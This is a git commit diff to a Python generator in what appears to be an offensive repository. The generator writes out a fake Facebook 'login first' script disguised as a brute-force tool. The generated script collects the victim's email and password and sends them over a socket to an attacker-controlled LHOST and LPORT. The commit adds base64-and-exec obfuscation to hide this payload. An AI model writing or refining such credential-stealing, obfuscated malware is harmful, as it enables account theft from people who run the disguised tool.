93bf1715d969711e488a43364bf654f6ba927819
MQuwais <azzura.aprl@gmail.com>
2021-11-26 02:07:21 +0700

    .

--- payload/facebook/phising/inject/injects.py
+++ payload/facebook/phising/inject/injects.py
@@ -2,9 +2,12 @@
 # Author : Muhammad Quwais Saputra
 ###
 
+import base64
+
 def sbd_injects(f_name,LHOST,LPORT):
     scripts = """
 import socket 
+import getpass
 
 def SLogin():
     LHOST="{0}"
@@ -13,7 +16,7 @@ def SLogin():
     s.connect((LHOST,int(LPORT)))
     print("[!] You Must Login First!!")
     x = input("[?] Your email/id : ")
-    f = input("[?] Your Password : ")
+    f = getpass.getpass(prompt="[?] Your Password : ")
     b_s = bytes(x,encoding="utf-8")
     b_x = bytes(f,encoding="utf-8")
     s.send(b_s)
@@ -24,8 +27,14 @@ SLogin()
 target = input("Target id : ")
 w = input("wordlist : ")
     """.format(LHOST,LPORT)
+    devil = base64.b64encode(scripts)
+
+    script_to_run = """
+import base64
+exec(base64.b64decode("{0}"))
+    """.format(devil)
     with open(f_name, "w") as f:
-        f.write(scripts)
+        f.write(script_to_run)
         f.close()
 
 def Injects(script, f_name, LHOST, LPORT):
